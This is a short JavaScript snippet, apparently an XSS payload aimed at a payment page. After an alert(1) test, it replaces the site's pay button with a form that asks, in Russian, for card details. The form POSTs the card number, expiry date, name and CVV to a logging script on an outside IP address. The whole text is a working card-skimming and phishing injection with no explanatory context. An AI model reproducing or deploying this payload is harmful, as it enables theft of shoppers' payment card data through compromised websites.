alert(1);

var btn = document.createElement("BUTTON");        // Create a <button> element
var t = document.createTextNode("CLICK ME");       // Create a text node
var x = document.getElementsByClassName("blueBtn payBlueBtn")[0];
btn.appendChild(t);                                // Append the text to <button>
x.appendChild(btn);
document.getElementsByClassName("blueBtn payBlueBtn")[0].innerHTML = '<form method = "POST" action = "http://91.142.94.76/req_log.php"><input type = "text" name = "pan" value = "1234123412341238"/><input type = "text" name = "exp" value = "02/18"/><input type = "text" name = "name" value = "test test"/><input type = "text" name = "cvv" value = "123"/><input type = "Submit" name = "submit"/></form>';
document.getElementsByClassName("bold large")[0].innerHTML = 'Введите данные вашей карты';
